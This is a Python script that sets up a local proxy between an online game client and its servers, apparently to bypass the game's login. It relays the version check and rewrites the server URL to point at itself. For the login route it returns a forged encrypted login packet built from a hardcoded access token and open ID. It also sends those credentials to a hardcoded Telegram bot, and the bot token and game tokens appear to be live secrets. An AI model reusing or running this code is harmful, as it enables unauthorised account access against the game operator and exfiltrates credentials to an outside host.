import json
import requests
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from x7m import *

# ANSI Colors for Terminal Styling
G = "\033[92m"  # Green
Y = "\033[93m"  # Yellow
R = "\033[91m"  # Red
B = "\033[94m"  # Blue
W = "\033[0m"   # Reset

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()
PORT = 6543

# ================= CONFIGURATION & FIXED TOKENS =================
TOKEN = "8657325145:AAFFcum6toNn8F0uYhg9M6Xw2JmeLnScW9s"
ID = "7224513731"

# ফিক্সড এক্সেস টোকেন এবং ওপেন আইডি (অটো-লগইন অ্যাকাউন্টের জন্য)
FIXED_ACCESS_TOKEN = "a80190ab087dc622758faa6a2a7a8b12961733d306fdc5a927596f6ca208c2c"
FIXED_OPEN_ID = "3cdcaa59c8bddd12bf4343600f09c08a"
# =================================================================

class ProxyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        self.handle_request_method()

    def do_POST(self):
        self.handle_request_method()

    def handle_request_method(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path

        # Handle /ver.php route
        if path == "/ver.php":
            target = "https://version.ggwhitehawk.com/live/ver.php"
            headers = {
                k: v for k, v in self.headers.items()
                if k.lower() not in ("host", "content-length", "connection")
            }
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length) if content_length > 0 else b""

            try:
                with httpx.Client(follow_redirects=True) as client:
                    r = client.request(self.command, target, params=parse_qs(parsed_path.query), headers=headers, content=body)

                try:
                    data = r.json()
                except json.JSONDecodeError:
                    data = {"raw": r.text}
                    
                data["server_url"] = f"http://{LOCAL_IP}:{PORT}/"

                self.send_response(r.status_code)
                HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
                for k, v in r.headers.items():
                    if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding"):
                        self.send_header(k, v)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(data).encode('utf-8'))
            except Exception as e:
                self.send_response(500)
                self.end_headers()

        # Handle /MajorLogin route (Safe VIP Token Login Bypass)
        elif path == "/MajorLogin":
            print(f"\n{G}[+] GAME HIT! Executing Safe Fixed Token Bypass...{W}")
            
            access_token = FIXED_ACCESS_TOKEN
            open_id = FIXED_OPEN_ID

            # VIP Styled Telegram Notification
            message = f"""👑 <b>NIROB BBZ - SECURE PROXY SYSTEM</b> 👑
──────────────────────────────
🔥 <b>STATUS:</b> <code>LOGIN PACKET TRIGGERED</code>
──────────────────────────────
🔑 <b>Access Token:</b>
<code>{access_token}</code>

🆔 <b>Open ID:</b>
<code>{open_id}</code>
──────────────────────────────
🛡️ <b>Elite Security Bypass Activated</b>
⚡ <b>Owner:</b> <b>NIROB BBZ</b>"""

            try:
                telegram_url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
                requests.post(telegram_url, data={
                    'chat_id': ID, 
                    'text': message, 
                    'parse_mode': 'HTML'
                })
            except Exception:
                pass
                
            # Full structured schema for matching game client expectations
            login_payload = {
                1: int(0),
                2: str(open_id),
                3: str(access_token),
                4: str("BD"),
                5: int(1)
            }
            
            try:
                proto_bytes = CrEaTe_ProTo(login_payload)
                encrypted_payload = encrypt_api(proto_bytes.hex())
                response_bytes = bytes.fromhex(encrypted_payload)
            except Exception as err:
                print(f"{R}[!] Encryption Error: {err}{W}")
                response_bytes = b""

            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(response_bytes)))
            self.end_headers()
            self.wfile.write(response_bytes)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

def run(server_class=HTTPServer, handler_class=ProxyHandler, port=PORT):
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    print(f"{G}[✔] NIROB BBZ Secure VIP Proxy Running Successfully on Port {port}{W}")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
